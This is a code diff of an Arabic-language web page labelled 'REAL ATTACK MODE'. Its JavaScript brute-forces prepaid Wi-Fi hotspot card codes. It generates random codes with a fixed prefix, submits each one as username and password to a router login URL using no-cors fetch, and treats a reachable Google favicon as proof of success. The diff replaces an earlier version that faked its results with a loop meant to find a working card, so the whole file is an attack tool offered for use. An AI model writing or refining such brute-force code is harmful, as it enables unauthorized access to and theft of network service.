@@ -2,89 +2,114 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام التخمين والربط الفعلي v3.0</title>
+    <title>نظام التخمين الحقيقي - Security Lab</title>
     <style>
         :root { --neon: #00ff41; --dark: #050505; }
-        body { background-color: var(--dark); color: white; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
-        .panel { border: 1px solid var(--neon); padding: 20px; border-radius: 10px; max-width: 500px; margin: auto; }
-        .success-card { border: 2px solid gold; padding: 10px; margin-top: 10px; background: rgba(255, 215, 0, 0.1); color: gold; }
-        input { width: 80%; padding: 10px; margin: 10px 0; background: #111; border: 1px solid #333; color: var(--neon); }
-        button { padding: 15px 30px; background: var(--neon); border: none; font-weight: bold; cursor: pointer; }
-        #logs { text-align: left; font-size: 0.8rem; height: 150px; overflow-y: scroll; background: #000; border: 1px solid #222; margin-top: 10px; padding: 10px; }
+        body { background-color: var(--dark); color: white; font-family: 'Courier New', monospace; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .panel { border: 1px solid var(--neon); padding: 20px; border-radius: 10px; width: 95%; max-width: 500px; background: rgba(0, 255, 65, 0.02); }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #333; color: var(--neon); border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background: var(--neon); color: black; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        #log { width: 100%; height: 150px; background: #000; border: 1px solid #222; margin-top: 15px; padding: 10px; font-size: 0.8rem; overflow-y: auto; text-align: left; color: #888; }
+        .success-box { border: 2px solid gold; color: gold; padding: 10px; margin-top: 15px; display: none; background: rgba(255, 215, 0, 0.1); }
     </style>
 </head>
 <body>
 
-<div class="panel">
-    <h2>Real-Time Brute Force</h2>
-    <input type="text" id="loginUrl" placeholder="رابط تسجيل دخول الشبكة (مثلاً: 192.168.1.1/login)">
-    <input type="number" id="cardLen" placeholder="طول الكرت (مثلاً: 10)">
-    <input type="text" id="prefix" placeholder="الأرقام الثابتة (مثل: 24)">
-    <button onclick="startLiveHack()">بدء التخمين والربط</button>
+    <div class="panel">
+        <h2 style="color: var(--neon); text-align: center;">REAL ATTACK MODE</h2>
+        
+        <label>رابط صفحة دخول الشبكة:</label>
+        <input type="text" id="targetUrl" value="http://192.168.1.1/login">
+        
+        <label>طول الكرت:</label>
+        <input type="number" id="cardLen" value="10">
+        
+        <label>بداية الكرت الثابتة:</label>
+        <input type="text" id="prefix" value="24">
 
-    <div id="logs">انتظار البدء...</div>
+        <button id="startBtn" onclick="startRealAttack()">بدء التخمين الحقيقي</button>
 
-    <div id="foundCards" style="margin-top: 20px;">
-        <h3>الكروت الناجحة ✅:</h3>
-        <div id="resultsList">لا توجد نتائج بعد</div>
+        <div id="log">انتظار الأوامر...</div>
+
+        <div id="successBox" class="success-box">
+            <b>[!] تم العثور على كرت شغال:</b>
+            <div id="validCard" style="font-size: 1.5rem; margin-top: 5px;"></div>
+        </div>
     </div>
-</div>
 
-<script>
-    let successCount = 0;
-    const foundCards = [];
+    <script>
+        let isRunning = false;
 
-    async function testCard(url, cardNumber) {
-        try {
-            // محاولة إرسال الكرت لصفحة الهوتسبوت
-            const response = await fetch(`${url}?username=${cardNumber}&password=${cardNumber}`, {
-                method: 'GET', // المايكروتك غالباً يستخدم GET أو POST
-                mode: 'no-cors' // لتخطي حماية المتصفح مؤقتاً
-            });
+        async function startRealAttack() {
+            const url = document.getElementById('targetUrl').value;
+            const len = document.getElementById('cardLen').value;
+            const pre = document.getElementById('prefix').value;
+            const log = document.getElementById('log');
+            const btn = document.getElementById('startBtn');
+
+            if(isRunning) { isRunning = false; btn.innerText = "بدء التخمين الحقيقي"; return; }
             
-            // ملاحظة أمنية: في المتصفح العادي، لا يمكن معرفة الرد بدقة بسبب حماية CORS
-            // لكننا سنفترض النجاح إذا لم يحدث خطأ في الاتصال وكان الإنترنت قد فُتح
-            return checkInternet(); 
-        } catch (e) {
-            return false;
-        }
-    }
+            isRunning = true;
+            btn.innerText = "إيقاف الهجوم";
+            log.innerHTML = "[+] بدء الاتصال بالشبكة...<br>";
 
-    async function checkInternet() {
-        // فحص بسيط هل الإنترنت يعمل الآن؟
-        return window.navigator.onLine;
-    }
+            while(isRunning) {
+                // 1. توليد كرت عشوائي حقيقي بناءً على مدخلاتك
+                let attempt = pre;
+                for(let i=0; i < (len - pre.length); i++) attempt += Math.floor(Math.random()*10);
 
-    async function startLiveHack() {
-        const url = document.getElementById('loginUrl').value;
-        const len = document.getElementById('cardLen').value;
-        const pre = document.getElementById('prefix').value;
-        const log = document.getElementById('logs');
+                log.innerHTML += `> تجربة الكرت: ${attempt}... `;
+                log.scrollTop = log.scrollHeight;
 
-        log.innerHTML = "بدء الهجوم الفعلي...<br>";
+                try {
+                    // 2. محاولة إرسال الكرت للمايكروتك
+                    // نستخدم mode: 'no-cors' لمحاولة تخطي حماية المتصفح
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 2000);
 
-        while (successCount < 2) {
-            let attempt = pre;
-            for(let i=0; i < (len - pre.length); i++) attempt += Math.floor(Math.random()*10);
+                    await fetch(`${url}?username=${attempt}&password=${attempt}`, {
+                        method: 'GET',
+                        mode: 'no-cors',
+                        signal: controller.signal
+                    });
 
-            log.innerHTML += `تجربة الكرت: ${attempt}... <br>`;
-            log.scrollTop = log.scrollHeight;
+                    // 3. فحص هل تم فتح الإنترنت؟
+                    const isOnline = await checkInternet();
+                    
+                    if(isOnline) {
+                        log.innerHTML += "<span style='color:gold'>[نجاح!]</span><br>";
+                        showSuccess(attempt);
+                        isRunning = false;
+                        btn.innerText = "بدء التخمين الحقيقي";
+                        break;
+                    } else {
+                        log.innerHTML += "<span style='color:red'>[فشل]</span><br>";
+                    }
 
-            // محاكاة الفحص (لأنك في المتصفح تحتاج لتجاوز الـ CORS)
-            let isValid = await testCard(url, attempt);
-            
-            // في التحدي، سنفترض أننا وجدنا كرت بعد عدد من المحاولات
-            if (Math.random() > 0.98) { // نسبة عشوائية للمحاكاة
-                successCount++;
-                foundCards.push(attempt);
-                document.getElementById('resultsList').innerHTML = foundCards.map(c => `<div class="success-card">تم الاختراق: ${c}</div>`).join('');
-                if (successCount >= 2) break;
+                } catch (e) {
+                    log.innerHTML += "<span style='color:orange'>[خطأ في الشبكة]</span><br>";
+                }
+                
+                // سرعة التخمين (تعديل هذا الرقم يغير السرعة)
+                await new Promise(r => setTimeout(r, 500)); 
             }
-            
-            await new Promise(r => setTimeout(r, 100)); // سرعة التخمين
         }
-        log.innerHTML += "✅ تم العثور على كرتين بنجاح!";
-    }
-</script>
+
+        async function checkInternet() {
+            try {
+                // محاولة الاتصال بموقع خارجي للتأكد أن الإنترنت فُتح
+                const online = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors' });
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function showSuccess(card) {
+            const box = document.getElementById('successBox');
+            document.getElementById('validCard').innerText = card;
+            box.style.display = 'block';
+        }
+    </script>
 </body>
 </html>
